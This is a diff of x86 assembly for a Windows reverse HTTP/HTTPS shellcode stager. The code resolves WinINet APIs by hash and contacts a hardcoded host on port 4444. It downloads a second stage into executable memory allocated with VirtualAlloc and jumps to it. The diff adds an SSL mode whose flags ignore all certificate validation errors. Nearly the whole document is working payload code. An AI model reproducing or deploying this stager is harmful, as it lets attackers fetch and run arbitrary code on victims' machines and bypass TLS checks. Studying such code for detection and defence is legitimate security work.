@@ -6,6 +6,25 @@
 ;-----------------------------------------------------------------------------;
 [BITS 32]
 
+%ifdef ENABLE_SSL
+%define HTTP_OPEN_FLAGS ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000 )
+  ;0x80000000 | ; INTERNET_FLAG_RELOAD
+  ;0x04000000 | ; INTERNET_NO_CACHE_WRITE
+  ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
+  ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
+  ;0x00000200 | ; INTERNET_FLAG_NO_UI
+  ;0x00800000 | ; INTERNET_FLAG_SECURE
+  ;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+  ;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+%else
+%define HTTP_OPEN_FLAGS ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
+  ;0x80000000 | ; INTERNET_FLAG_RELOAD
+  ;0x04000000 | ; INTERNET_NO_CACHE_WRITE
+  ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
+  ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
+  ;0x00000200   ; INTERNET_FLAG_NO_UI
+%endif
+
 ; Input: EBP must be the address of 'api_call'.
 ; Output: EDI will be the socket for the connection to the server
 ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
@@ -16,65 +35,74 @@ load_wininet:
   push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
   call ebp               ; LoadLibraryA( "wininet" )
 
+  xor ebx,ebx
+
 internetopen:
-  xor edi,edi
-  push edi               ; DWORD dwFlags
-  push edi               ; LPCTSTR lpszProxyBypass
-  push edi               ; LPCTSTR lpszProxyName
-  push edi               ; DWORD dwAccessType (PRECONFIG = 0)
-  push byte 0            ; NULL pointer
-  push esp               ; LPCTSTR lpszAgent ("\x00")
+  push ebx               ; DWORD dwFlags
+  push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+  push ebx               ; LPCTSTR lpszProxyName (NULL)
+  push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
+  push ebx               ; LPCTSTR lpszAgent (NULL)
   push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
   call ebp
 
-  jmp short dbl_get_server_host
-
 internetconnect:
-  pop ebx                ; Save the hostname pointer
-  xor ecx, ecx
-  push ecx               ; DWORD_PTR dwContext (NULL)
-  push ecx               ; dwFlags
+  push ebx               ; DWORD_PTR dwContext (NULL)
+  push ebx               ; dwFlags
   push byte 3            ; DWORD dwService (INTERNET_SERVICE_HTTP)
-  push ecx               ; password
-  push ecx               ; username
+  push ebx               ; password (NULL)
+  push ebx               ; username (NULL)
   push dword 4444        ; PORT
-  push ebx               ; HOSTNAME
+  jmp short dbl_get_server_host ; push pointer to HOSTNAME
+got_server_host:
   push eax               ; HINTERNET hInternet
   push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
   call ebp
 
-  jmp get_server_uri
-
 httpopenrequest:
-  pop ecx
-  xor edx, edx           ; NULL
-  push edx               ; dwContext (NULL)
-  push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags
-    ;0x80000000 |        ; INTERNET_FLAG_RELOAD
-    ;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
-	;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
-    ;0x00000200 |        ; INTERNET_FLAG_NO_UI
-    ;0x00400000          ; INTERNET_FLAG_KEEP_CONNECTION
-  push edx               ; accept types
-  push edx               ; referrer
-  push edx               ; version
-  push ecx               ; url
-  push edx               ; method
+  push ebx               ; dwContext (NULL)
+  push HTTP_OPEN_FLAGS   ; dwFlags
+  push ebx               ; accept types
+  push ebx               ; referrer
+  push ebx               ; version
+  jmp get_server_uri     ; push pointer to url
+got_server_uri:
+  push ebx               ; method
   push eax               ; hConnection
   push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
   call ebp
-  mov esi, eax           ; hHttpRequest
+  xchg esi, eax          ; save hHttpRequest in esi
 
 set_retry:
   push byte 0x10
-  pop ebx
+  pop edi
+
+send_request:
+
+%ifdef ENABLE_SSL
+; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
+set_security_options:
+  push 0x00003380
+    ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+    ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+    ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
+    ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
+    ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
+  mov eax, esp
+  push byte 4            ; sizeof(dwFlags)
+  push eax               ; &dwFlags
+  push byte 31           ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
+  push esi               ; hHttpRequest
+  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
+  call ebp
+
+%endif
 
 httpsendrequest:
-  xor edi, edi
-  push edi               ; optional length
-  push edi               ; optional
-  push edi               ; dwHeadersLength
-  push edi               ; headers
+  push ebx               ; lpOptional length (0)
+  push ebx               ; lpOptional (NULL)
+  push ebx               ; dwHeadersLength (0)
+  push ebx               ; lpszHeaders (NULL)
   push esi               ; hHttpRequest
   push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
   call ebp
@@ -82,28 +110,30 @@ httpsendrequest:
   jnz short allocate_memory
 
 try_it_again:
-  dec ebx
-  jz failure
-  jmp short httpsendrequest
+  dec edi
+  jnz send_request
 
-dbl_get_server_host:
-  jmp get_server_host
-
-get_server_uri:
-  call httpopenrequest
-
-server_uri:
- db "/12345", 0x00
+; if we didn't allocate before running out of retries, fall through to
+; failure
 
 failure:
   push 0x56A2B5F0        ; hardcoded to exitprocess for size
   call ebp
 
+dbl_get_server_host:
+  jmp get_server_host
+
+get_server_uri:
+  call got_server_uri
+
+server_uri:
+ db "/12345", 0x00
+
 allocate_memory:
   push byte 0x40         ; PAGE_EXECUTE_READWRITE
   push 0x1000            ; MEM_COMMIT
   push 0x00400000        ; Stage allocation (8Mb ought to do us)
-  push edi               ; NULL as we dont care where the allocation is (zero'd from the prev function)
+  push ebx               ; NULL as we dont care where the allocation is
   push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
   call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
@@ -135,7 +165,7 @@ execute_stage:
   ret                    ; dive into the stored stage address
 
 get_server_host:
-  call internetconnect
+  call got_server_host
 
 server_host:
 
